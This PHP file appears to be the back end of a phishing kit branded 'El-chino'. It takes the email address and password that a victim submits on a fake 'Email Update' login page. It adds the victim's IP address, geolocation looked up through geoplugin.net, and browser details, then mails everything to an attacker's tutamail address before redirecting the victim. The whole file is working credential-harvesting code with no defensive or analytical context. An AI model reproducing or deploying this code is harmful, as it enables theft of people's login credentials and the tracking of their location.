<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$regionName = visitor_regionName();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$pass = $_POST['password'];
$own = 'neatweek@tutamail.com;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$server = date("D/M/d, Y g:i a"); 
$sender = 'neatweek@tutamail.co';
$page = 'Email Update';
$subj = "$page Login for El-chino";
$headers .= "From: El-chino<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = '';
$msg = "<HTML><BODY><TABLE>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'><b>El-chino</b><img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>_________</td></tr>
 <tr><td>$page I.D: $email | Password: $pass<br>IP: $country | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> | <img src='http://www.translatorscafe.com/cafe/images/flags/$countryCode.gif' height='12' /> | $countryCode | $continentCode | $regionName | Date: $server </td></tr>
 <tr><td>________<img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'><b>Keep the faith alive</b><img src='https://mail.google.com/mail/u/0/e/B60' goomoji='B60'>__________</td></tr>
 <tr><td>User-Agent: '$browser' 
 <br />URL: http://$web$inj </td></tr>
 <tr><td><b>El-chino* :</b> Nobody be anybody to somebody </td></tr>
 </BODY>
 </HTML>";
if (empty($email) || empty($pass)) {
header( "Location: #" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: #");
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>
